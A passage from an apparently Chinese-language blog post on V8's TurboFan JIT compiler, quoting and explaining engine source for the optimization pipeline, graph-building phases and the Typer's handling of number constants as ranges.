(compilation_info-&gt;shared_info()-&gt;HasBreakInfo()) &#123;</span><br><span class="line">    compilation_info-&gt;AbortOptimization(BailoutReason::kFunctionBeingDebugged);</span><br><span class="line">    <span class="keyword">return</span> MaybeHandle&lt;Code&gt;();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Do not use TurboFan when %NeverOptimizeFunction was applied.</span></span><br><span class="line">  <span class="keyword">if</span> (shared-&gt;optimization_disabled() &amp;&amp;</span><br><span class="line">      shared-&gt;disable_optimization_reason() ==</span><br><span class="line">          BailoutReason::kOptimizationDisabledForTest) &#123;</span><br><span class="line">    compilation_info-&gt;AbortOptimization(</span><br><span class="line">        BailoutReason::kOptimizationDisabledForTest);</span><br><span class="line">    <span class="keyword">return</span> MaybeHandle&lt;Code&gt;();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Do not use TurboFan if optimization is disabled or function doesn't pass</span></span><br><span class="line">  <span class="comment">// turbo_filter.</span></span><br><span class="line">  <span class="keyword">if</span> (!FLAG_opt || !shared-&gt;PassesFilter(FLAG_turbo_filter)) &#123;</span><br><span class="line">    compilation_info-&gt;AbortOptimization(BailoutReason::kOptimizationDisabled);</span><br><span class="line">    <span class="keyword">return</span> MaybeHandle&lt;Code&gt;();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">TimerEventScope&lt;TimerEventOptimizeCode&gt; <span class="title">optimize_code_timer</span><span class="params">(isolate)</span></span>;</span><br><span class="line">  <span class="function">RuntimeCallTimerScope <span class="title">runtimeTimer</span><span class="params">(isolate,</span></span></span><br><span class="line"><span class="function"><span class="params">                                     RuntimeCallCounterId::kOptimizeCode)</span></span>;</span><br><span class="line">  TRACE_EVENT0(TRACE_DISABLED_BY_DEFAULT(<span class="string">"v8.compile"</span>), <span class="string">"V8.OptimizeCode"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// In case of concurrent recompilation, all handles below this point will be</span></span><br><span class="line">  <span class="comment">// allocated in a deferred handle scope that is detached and handed off to</span></span><br><span class="line">  <span class="comment">// the background thread when we return.</span></span><br><span class="line">  base::Optional&lt;CompilationHandleScope&gt; compilation;</span><br><span class="line">  <span class="keyword">if</span> (mode == ConcurrencyMode::kConcurrent) &#123;</span><br><span class="line">    compilation.emplace(isolate, compilation_info);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// All handles below will be canonicalized.</span></span><br><span class="line">  <span class="function">CanonicalHandleScope <span class="title">canonical</span><span class="params">(isolate)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Reopen handles in the new CompilationHandleScope.</span></span><br><span class="line">  compilation_info-&gt;ReopenHandlesInNewHandleScope(isolate);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mode == ConcurrencyMode::kConcurrent) &#123;</span><br><span class="line">    <span class="keyword">if</span> (GetOptimizedCodeLater(job.get(), isolate)) &#123;</span><br><span class="line">      job.release();  <span class="comment">// The background recompile job owns this now.</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// Set the optimization marker and return a code object which checks it.</span></span><br><span class="line">      function-&gt;SetOptimizationMarker(OptimizationMarker::kInOptimizationQueue);</span><br><span class="line">      DCHECK(function-&gt;IsInterpreted() ||</span><br><span class="line">             (!function-&gt;is_compiled() &amp;&amp; function-&gt;shared()-&gt;IsInterpreted()));</span><br><span class="line">      DCHECK(function-&gt;shared()-&gt;HasBytecodeArray());</span><br><span class="line">      <span class="keyword">return</span> BUILTIN_CODE(isolate, InterpreterEntryTrampoline);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (GetOptimizedCodeNow(job.get(), isolate))</span><br><span class="line">      <span class="keyword">return</span> compilation_info-&gt;code();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isolate-&gt;has_pending_exception()) isolate-&gt;clear_pending_exception();</span><br><span class="line">  <span class="keyword">return</span> MaybeHandle&lt;Code&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数代码有点长，这里总结一下所做的操作：</p>
<ul>
<li>
<p>如果之前该函数被mark为待优化的，则取消该mark（回想一下<code>--trace-opt</code>的输出）</p>
</li>
<li>
<p>如果debugger需要hook该函数，或者在该函数上下了断点，则不优化该函数，直接返回。</p>
</li>
<li>
<p>如果之前已经优化过该函数（存在OptimizedCodeCache），则直接返回之前优化后的代码。</p>
</li>
<li>
<p>重置当前函数的<code>profiler ticks</code>，使得该函数<strong>不再hot</strong>，这样做的目的是使当前函数不被重复优化。</p>
</li>
<li>
<p>如果设置了一些禁止优化的参数（例如<code>%NeverOptimizeFunction</code>，或者设置了<code>turbo_filter</code>），则取消当前函数的优化。</p>
</li>
<li>
<p>以上步骤完成后则开始优化代码，优化代码也有两种不同的方式，分别是<strong>并行优化</strong>和<strong>非并行优化</strong>。在大多数情况下执行的都是并行优化，因为速度更快。</p>
<p>并行优化会先执行<code>GetOptimizedCodeLater</code>函数，在该函数中判断一些异常条件，例如任务队列已满或者内存占用过高。如果没有异常条件，则执行<code>OptimizedCompilationJob::PrepareJob</code>函数，并继续在更深层次的调用<code>PipelineImpl::CreateGraph</code>来<strong>建图</strong>。</p>
<p>如果<code>GetOptimizedCodeLater</code>函数工作正常，则将会把优化任务<code>Job</code>放入任务队列中。任务队列将安排另一个线程执行优化操作。</p>
<p>另一个线程的栈帧如下，该线程将执行<code>Job-&gt;ExecuteJob</code>并在更深层次调用<code>PipelineImpl::OptimizeGraph</code>来<strong>优化之前建立的图结构</strong>：</p>
<p><img src="/2021/01/v8-turboFan/OptimizeGraph-bt1.png" alt="img"></p>
<p>当另一个线程在优化代码时，主线程可以继续执行其他任务：</p>
<p><img src="/2021/01/v8-turboFan/threads.png" alt="img"></p>
</li>
</ul>
</li>
<li>
<p>综上我们可以得知，JIT最终的优化位于<code>PipelineImpl</code>类中，包括建图以及优化图等</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// v8\src\compiler\pipeline.cc</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PipelineImpl</span> <span class="title">final</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">PipelineImpl</span><span class="params">(PipelineData* data)</span> : <span class="title">data_</span><span class="params">(data)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Helpers for executing pipeline phases.</span></span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">typename</span> Phase&gt;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Run</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">typename</span> Phase, <span class="keyword">typename</span> Arg0&gt;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Run</span><span class="params">(Arg0 arg_0)</span></span>;</span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">typename</span> Phase, <span class="keyword">typename</span> Arg0, <span class="keyword">typename</span> Arg1&gt;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Run</span><span class="params">(Arg0 arg_0, Arg1 arg_1)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step A. Run the graph creation and initial optimization passes.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">CreateGraph</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// B. Run the concurrent optimization passes.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">OptimizeGraph</span><span class="params">(Linkage* linkage)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Substep B.1. Produce a scheduled graph.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">ComputeScheduledGraph</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Substep B.2. Select instructions from a scheduled graph.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">SelectInstructions</span><span class="params">(Linkage* linkage)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step C. Run the code assembly pass.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">AssembleCode</span><span class="params">(Linkage* linkage)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step D. Run the code finalization pass.</span></span><br><span class="line">  <span class="function">MaybeHandle&lt;Code&gt; <span class="title">FinalizeCode</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Step E. Install any code dependencies.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">CommitDependencies</span><span class="params">(Handle&lt;Code&gt; code)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">VerifyGeneratedCodeIsIdempotent</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">RunPrintAndVerify</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* phase, <span class="keyword">bool</span> untyped = <span class="literal">false</span>)</span></span>;</span><br><span class="line">  <span class="function">MaybeHandle&lt;Code&gt; <span class="title">GenerateCode</span><span class="params">(CallDescriptor* call_descriptor)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">AllocateRegisters</span><span class="params">(<span class="keyword">const</span> RegisterConfiguration* config,</span></span></span><br><span class="line"><span class="function"><span class="params">                         CallDescriptor* call_descriptor, <span class="keyword">bool</span> run_verifier)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="function">OptimizedCompilationInfo* <span class="title">info</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">  <span class="function">Isolate* <span class="title">isolate</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line">  <span class="function">CodeGenerator* <span class="title">code_generator</span><span class="params">()</span> <span class="keyword">const</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  PipelineData* <span class="keyword">const</span> data_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="五、初探optimization-phases">五、初探optimization phases</h2>
<h3 id="1-简介">1. 简介</h3>
<p>与LLVM IR的各种Pass类似，turboFan中使用各类phases进行建图、搜集信息以及简化图。</p>
<p>以下是<code>PipelineImpl::CreateGraph</code>函数源码，其中使用了大量的<code>Phase</code>。这些<code>Phase</code>有些用于建图，有些用于优化（在建图时也会执行一部分简单的优化），还有些为接下来的优化做准备：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">PipelineImpl::CreateGraph</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  PipelineData* data = <span class="keyword">this</span>-&gt;data_;</span><br><span class="line"></span><br><span class="line">  data-&gt;BeginPhaseKind(<span class="string">"graph creation"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (info()-&gt;trace_turbo_json_enabled() ||</span><br><span class="line">      info()-&gt;trace_turbo_graph_enabled()) &#123;</span><br><span class="line">    <span class="function">CodeTracer::Scope <span class="title">tracing_scope</span><span class="params">(data-&gt;GetCodeTracer())</span></span>;</span><br><span class="line">    <span class="function">OFStream <span class="title">os</span><span class="params">(tracing_scope.file())</span></span>;</span><br><span class="line">    os &lt;&lt; <span class="string">"---------------------------------------------------\n"</span></span><br><span class="line">       &lt;&lt; <span class="string">"Begin compiling method "</span> &lt;&lt; info()-&gt;GetDebugName().get()</span><br><span class="line">       &lt;&lt; <span class="string">" using Turbofan"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (info()-&gt;trace_turbo_json_enabled()) &#123;</span><br><span class="line">    <span class="function">TurboCfgFile <span class="title">tcf</span><span class="params">(isolate())</span></span>;</span><br><span class="line">    tcf &lt;&lt; AsC1VCompilation(info());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  data-&gt;source_positions()-&gt;AddDecorator();</span><br><span class="line">  <span class="keyword">if</span> (data-&gt;info()-&gt;trace_turbo_json_enabled()) &#123;</span><br><span class="line">    data-&gt;node_origins()-&gt;AddDecorator();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Run&lt;GraphBuilderPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(GraphBuilderPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Perform function context specialization and inlining (if enabled).</span></span><br><span class="line">  Run&lt;InliningPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(InliningPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove dead-&gt;live edges from the graph.</span></span><br><span class="line">  Run&lt;EarlyGraphTrimmingPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(EarlyGraphTrimmingPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Run the type-sensitive lowerings and optimizations on the graph.</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// Determine the Typer operation flags.</span></span><br><span class="line">    Typer::Flags flags = Typer::kNoFlags;</span><br><span class="line">    <span class="keyword">if</span> (is_sloppy(info()-&gt;shared_info()-&gt;language_mode()) &amp;&amp;</span><br><span class="line">        info()-&gt;shared_info()-&gt;IsUserJavaScript()) &#123;</span><br><span class="line">      <span class="comment">// Sloppy mode functions always have an Object for this.</span></span><br><span class="line">      flags |= Typer::kThisIsReceiver;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (IsClassConstructor(info()-&gt;shared_info()-&gt;kind())) &#123;</span><br><span class="line">      <span class="comment">// Class constructors cannot be [[Call]]ed.</span></span><br><span class="line">      flags |= Typer::kNewTargetIsReceiver;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Type the graph and keep the Typer running on newly created nodes within</span></span><br><span class="line">    <span class="comment">// this scope; the Typer is automatically unlinked from the Graph once we</span></span><br><span class="line">    <span class="comment">// leave this scope below.</span></span><br><span class="line">    <span class="function">Typer <span class="title">typer</span><span class="params">(isolate(), data-&gt;js_heap_broker(), flags, data-&gt;graph())</span></span>;</span><br><span class="line">    Run&lt;TyperPhase&gt;(&amp;typer);</span><br><span class="line">    RunPrintAndVerify(TyperPhase::phase_name());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do some hacky things to prepare for the optimization phase.</span></span><br><span class="line">    <span class="comment">// (caching handles, etc.).</span></span><br><span class="line">    Run&lt;ConcurrentOptimizationPrepPhase&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FLAG_concurrent_compiler_frontend) &#123;</span><br><span class="line">      data-&gt;js_heap_broker()-&gt;SerializeStandardObjects();</span><br><span class="line">      Run&lt;CopyMetadataForConcurrentCompilePhase&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Lower JSOperators where we can determine types.</span></span><br><span class="line">    Run&lt;TypedLoweringPhase&gt;();</span><br><span class="line">    RunPrintAndVerify(TypedLoweringPhase::phase_name());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  data-&gt;EndPhaseKind();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>PipelineImpl::OptimizeGraph</code>函数代码如下，该函数将会对所建立的图进行优化：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">PipelineImpl::OptimizeGraph</span><span class="params">(Linkage* linkage)</span> </span>&#123;</span><br><span class="line">  PipelineData* data = <span class="keyword">this</span>-&gt;data_;</span><br><span class="line"></span><br><span class="line">  data-&gt;BeginPhaseKind(<span class="string">"lowering"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (data-&gt;info()-&gt;is_loop_peeling_enabled()) &#123;</span><br><span class="line">    Run&lt;LoopPeelingPhase&gt;();</span><br><span class="line">    RunPrintAndVerify(LoopPeelingPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Run&lt;LoopExitEliminationPhase&gt;();</span><br><span class="line">    RunPrintAndVerify(LoopExitEliminationPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (FLAG_turbo_load_elimination) &#123;</span><br><span class="line">    Run&lt;LoadEliminationPhase&gt;();</span><br><span class="line">    RunPrintAndVerify(LoadEliminationPhase::phase_name());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (FLAG_turbo_escape) &#123;</span><br><span class="line">    Run&lt;EscapeAnalysisPhase&gt;();</span><br><span class="line">    <span class="keyword">if</span> (data-&gt;compilation_failed()) &#123;</span><br><span class="line">      info()-&gt;AbortOptimization(</span><br><span class="line">          BailoutReason::kCyclicObjectStateDetectedInEscapeAnalysis);</span><br><span class="line">      data-&gt;EndPhaseKind();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    RunPrintAndVerify(EscapeAnalysisPhase::phase_name());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Perform simplified lowering. This has to run w/o the Typer decorator,</span></span><br><span class="line">  <span class="comment">// because we cannot compute meaningful types anyways, and the computed types</span></span><br><span class="line">  <span class="comment">// might even conflict with the representation/truncation logic.</span></span><br><span class="line">  Run&lt;SimplifiedLoweringPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(SimplifiedLoweringPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// From now on it is invalid to look at types on the nodes, because the types</span></span><br><span class="line">  <span class="comment">// on the nodes might not make sense after representation selection due to the</span></span><br><span class="line">  <span class="comment">// way we handle truncations; if we'd want to look at types afterwards we'd</span></span><br><span class="line">  <span class="comment">// essentially need to re-type (large portions of) the graph.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// In order to catch bugs related to type access after this point, we now</span></span><br><span class="line">  <span class="comment">// remove the types from the nodes (currently only in Debug builds).</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">  Run&lt;UntyperPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(UntyperPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Run generic lowering pass.</span></span><br><span class="line">  Run&lt;GenericLoweringPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(GenericLoweringPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  data-&gt;BeginPhaseKind(<span class="string">"block building"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Run early optimization pass.</span></span><br><span class="line">  Run&lt;EarlyOptimizationPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(EarlyOptimizationPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  Run&lt;EffectControlLinearizationPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(EffectControlLinearizationPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (FLAG_turbo_store_elimination) &#123;</span><br><span class="line">    Run&lt;StoreStoreEliminationPhase&gt;();</span><br><span class="line">    RunPrintAndVerify(StoreStoreEliminationPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Optimize control flow.</span></span><br><span class="line">  <span class="keyword">if</span> (FLAG_turbo_cf_optimization) &#123;</span><br><span class="line">    Run&lt;ControlFlowOptimizationPhase&gt;();</span><br><span class="line">    RunPrintAndVerify(ControlFlowOptimizationPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Optimize memory access and allocation operations.</span></span><br><span class="line">  Run&lt;MemoryOptimizationPhase&gt;();</span><br><span class="line">  <span class="comment">// TODO(jarin, rossberg): Remove UNTYPED once machine typing works.</span></span><br><span class="line">  RunPrintAndVerify(MemoryOptimizationPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Lower changes that have been inserted before.</span></span><br><span class="line">  Run&lt;LateOptimizationPhase&gt;();</span><br><span class="line">  <span class="comment">// TODO(jarin, rossberg): Remove UNTYPED once machine typing works.</span></span><br><span class="line">  RunPrintAndVerify(LateOptimizationPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  data-&gt;source_positions()-&gt;RemoveDecorator();</span><br><span class="line">  <span class="keyword">if</span> (data-&gt;info()-&gt;trace_turbo_json_enabled()) &#123;</span><br><span class="line">    data-&gt;node_origins()-&gt;RemoveDecorator();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ComputeScheduledGraph();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> SelectInstructions(linkage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于上面两个函数涉及到的<code>Phase</code>众多，这里请各位自行阅读源码来了解各个Phase的具体功能。</p>
<p>接下来我们只介绍几个比较重要的<code>Phases</code>：<code>GraphBuilderPhase</code>、<code>TyperPhase</code>和<code>SimplifiedLoweringPhase</code>。</p>
<h3 id="2-GraphBuilderPhase">2. GraphBuilderPhase</h3>
<ul>
<li>
<p><code>GraphBuilderPhase</code>将遍历字节码，并建一个初始的图，这个图将用于接下来Phase的处理，包括但不限于各种代码优化。</p>
</li>
<li>
<p>一个简单的例子</p>
<p><img src="/2021/01/v8-turboFan/bytecodegraphbuilder.png" alt="img"></p>
</li>
</ul>
<h3 id="3-TyperPhase">3. TyperPhase</h3>
<ul>
<li>
<p><code>TyperPhase</code>将会遍历整个图的所有结点，并给每个结点设置一个<code>Type</code>属性，该操作将在建图完成后被执行</p>
<blockquote>
<p>给每个结点设置Type的操作是不是极其类似于编译原理中的语义分析呢？ XD</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">PipelineImpl::CreateGraph</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  Run&lt;GraphBuilderPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(GraphBuilderPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// Run the type-sensitive lowerings and optimizations on the graph.</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Type the graph and keep the Typer running on newly created nodes within</span></span><br><span class="line">    <span class="comment">// this scope; the Typer is automatically unlinked from the Graph once we</span></span><br><span class="line">    <span class="comment">// leave this scope below.</span></span><br><span class="line">    <span class="function">Typer <span class="title">typer</span><span class="params">(isolate(), data-&gt;js_heap_broker(), flags, data-&gt;graph())</span></span>;</span><br><span class="line">    Run&lt;TyperPhase&gt;(&amp;typer);</span><br><span class="line">    RunPrintAndVerify(TyperPhase::phase_name());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中，具体执行的是<code>TyperPhase::Run</code>函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TyperPhase</span> &#123;</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">phase_name</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">"typer"</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone, Typer* typer)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    typer-&gt;Run(roots, &amp;induction_vars);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在该函数中继续调用<code>Typer::Run</code>函数，并在<code>GraphReducer::ReduceGraph</code>函数中最终调用到<code>Typer::Visitor::Reduce</code>函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Typer::Run</span><span class="params">(<span class="keyword">const</span> NodeVector&amp; roots,</span></span></span><br><span class="line"><span class="function"><span class="params">                LoopVariableOptimizer* induction_vars)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="function">Visitor <span class="title">visitor</span><span class="params">(<span class="keyword">this</span>, induction_vars)</span></span>;</span><br><span class="line">  <span class="function">GraphReducer <span class="title">graph_reducer</span><span class="params">(zone(), graph())</span></span>;</span><br><span class="line">  graph_reducer.AddReducer(&amp;visitor);</span><br><span class="line">  <span class="keyword">for</span> (Node* <span class="keyword">const</span> root : roots) graph_reducer.ReduceNode(root);</span><br><span class="line">  graph_reducer.ReduceGraph();</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>Typer::Visitor::Reduce</code>函数中存在一个较大的switch结构，通过该switch结构，当Visitor遍历每个node时，即可最终调用到对应的<code>XXXTyper</code>函数。</p>
<blockquote>
<p>例如，对于一个JSCall结点，将在TyperPhase中最终调用到<code>Typer::Visitor::JSCallTyper</code></p>
</blockquote>
</li>
<li>
<p>这里我们简单看一下<code>JSCallTyper</code>函数源码，该函数中存在一个很大的switch结构，该结构将设置每个<code>Builtin</code>函数结点的<code>Type</code>属性，即函数的返回值类型。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!fun.IsHeapConstant() || !fun.AsHeapConstant()-&gt;Ref().IsJSFunction()) &#123;</span><br><span class="line">    <span class="keyword">return</span> Type::NonInternal();</span><br><span class="line">  &#125;</span><br><span class="line">  JSFunctionRef function = fun.AsHeapConstant()-&gt;Ref().AsJSFunction();</span><br><span class="line">  <span class="keyword">if</span> (!function.shared().HasBuiltinFunctionId()) &#123;</span><br><span class="line">    <span class="keyword">return</span> Type::NonInternal();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">switch</span> (function.shared().builtin_function_id()) &#123;</span><br><span class="line">    <span class="keyword">case</span> BuiltinFunctionId::kMathRandom:</span><br><span class="line">      <span class="keyword">return</span> Type::PlainNumber();</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>而对于一个常数<code>NumberConstant</code>类型，<code>TyperPhase</code>也会打上一个对应的类型</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">Type Typer::Visitor::TypeNumberConstant(Node* node) </span><br><span class="line">  <span class="comment">// 注意这里使用的是double，这也就说明了为什么Number.MAX_SAFE_INTEGER = 9007199254740991</span></span><br><span class="line">  <span class="keyword">double</span> number = OpParameter&lt;<span class="keyword">double</span>&gt;(node-&gt;op());</span><br><span class="line">  <span class="keyword">return</span> Type::NewConstant(number, zone());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而在<code>Type::NewConstant</code>函数中，我们会发现一个神奇的设计：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Type <span class="title">Type::NewConstant</span><span class="params">(<span class="keyword">double</span> value, Zone* zone)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 对于一个正常的整数</span></span><br><span class="line">  <span class="keyword">if</span> (RangeType::IsInteger(value)) &#123;</span><br><span class="line">    <span class="comment">// 实际上所设置的Type是一个range！</span></span><br><span class="line">    <span class="keyword">return</span> Range(value, value, zone);</span><br><span class="line">  <span class="comment">// 否则如果是一个异常的-0,则返回对应的MinusZero</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (IsMinusZero(value)) &#123;</span><br><span class="line">    <span class="keyword">return</span> Type::MinusZero();</span><br><span class="line">  <span class="comment">// 如果是NAN，则返回NaN</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">std</span>::isnan(value)) &#123;</span><br><span class="line">    <span class="keyword">return</span> Type::NaN();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  DCHECK(OtherNumberConstantType::IsOtherNumberConstant(value));</span><br><span class="line">  <span class="keyword">return</span> OtherNumberConstant(value, zone);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于JS代码中的一个NumberConstant，<strong>实际上设置的Type是一个Range</strong>，只不过这个Range的首尾范围均是该数，例如<code>NumberConstant(3) =&gt; Range(3, 3, zone)</code></p>
</li>
<li>
<p>以下这张图可以证明<code>TyperPhase</code>正如预期那样执行：</p>
<p><img src="/2021/01/v8-turboFan/typer.png" alt="img"></p>
</li>
<li>
